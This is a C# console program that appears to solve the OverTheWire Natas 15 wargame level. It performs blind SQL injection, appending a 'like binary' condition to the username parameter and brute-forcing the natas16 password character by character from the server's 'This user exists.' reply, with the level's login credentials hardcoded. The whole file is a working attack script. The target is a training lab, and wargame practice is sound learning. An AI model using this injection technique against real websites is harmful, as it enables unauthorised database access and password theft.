using System;
using System.Linq;

using System.Net;
using System.IO;

namespace BruteNatas1
{
    class Program
    {
        static void Main(string[] args)
        {
            string html;
            string sumvols = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            string passwd = "";
            for (int i = 0; i < 50; i++)
            {

                for (int z = 0; z < sumvols.Length; z++)
                {


                    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create($"http://natas15.natas.labs.overthewire.org/?debug=1&username=natas16%22%20and%20password%20%20like%20binary%20%22{passwd + sumvols.ElementAt(z)}%");
                    request.Credentials = new NetworkCredential("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J");

                    using (HttpWebResponse req = (HttpWebResponse)request.GetResponse())
                    {
                        using (Stream str = (Stream)req.GetResponseStream())
                        {
                            using (StreamReader reder = new StreamReader(str))
                            {
                                html = reder.ReadToEnd();
                            }
                        }
                        if (html.Contains("This user exists."))
                        {
                            passwd += sumvols.ElementAt(z);
                            Console.WriteLine(passwd);
                            break;
                        }
                    }
                }

            }
            Console.ReadLine();

        }
    }
}
